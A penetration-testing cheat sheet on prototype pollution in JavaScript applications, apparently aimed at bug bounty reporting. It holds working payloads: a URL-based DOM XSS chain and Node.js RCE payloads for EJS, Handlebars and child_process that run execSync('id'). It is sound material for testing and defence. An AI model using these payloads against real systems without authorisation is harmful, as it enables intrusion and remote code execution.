# Prototype Pollution: Client-Side DOM XSS & Server-Side RCE

## Detection

### Client-Side (Browser)
```bash
# URL parameter fuzzing
https://target.com/page?__proto__[test]=polluted
# Then check in console:
Object.prototype.test === "polluted"
# Or:
({}).test === "polluted"
```

### Server-Side (JSON Body)
```http
POST /api/update-profile HTTP/1.1
Content-Type: application/json

{"__proto__":{"status":555},"name":"test"}
```
Check if error responses return `status:555` instead of expected codes.

## Client-Side Exploitation

### Source Discovery
Look for vulnerable merge/clone patterns in JS:
```js
// Unsafe merge
$.extend(true, target, source);  // jQuery
_.merge(target, source);          // Lodash
Object.assign(target, source);    // Native (shallow)
```

### Gadget Hunting
Search for patterns that read from undefined properties:
```js
// Gadgets that read from prototype chain
element.innerHTML = options.template;
document.write(config.html);
eval(settings.callback);
location.href = opts.redirectUrl;
```

### DOM XSS Chain
```bash
# 1. Pollute through URL
https://target.com/app#__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>

# 2. App reads: container.innerHTML = config.innerHtml || 'default'
# 3. config.innerHtml is undefined → reads from polluted prototype → XSS fires
```

## Server-Side Exploitation (Node.js RCE)

### EJS Template Engine
```http
POST /api/settings
{"__proto__":{"outputFunctionName":"x=process.mainModule.require('child_process').execSync('id').toString();s"}}
```
Then trigger any EJS template render → RCE.

### Handlebars Engine
```json
{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","parts":["constructor"]},"params":[{"type":"PathExpression","parts":["process","mainModule","require","child_process","execSync"]}]}]}}
```

### child_process Module
```json
{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--eval=require('child_process').execSync('id')"}}
```

### Express Config Gadgets
```json
{"__proto__":{"status":555}}
// Confirms pollution via observable status code change
```

## Tools

```bash
# PPScan - automated detection
ppscan -u "https://target.com/?__proto__[test]=polluted"
# Server-Side Prototype Pollution Scanner (Burp extension)
# ppmap - prototype pollution scanner
```

## Reporting Notes

Always chain prototype pollution to demonstrated impact:
- Client-side: pollution-only = Medium. Polluted to XSS = High/Critical.
- Server-side: pollution-only = Medium. Pollution to RCE = Critical.

Show the chain: pollution source → gadget → sink execution.
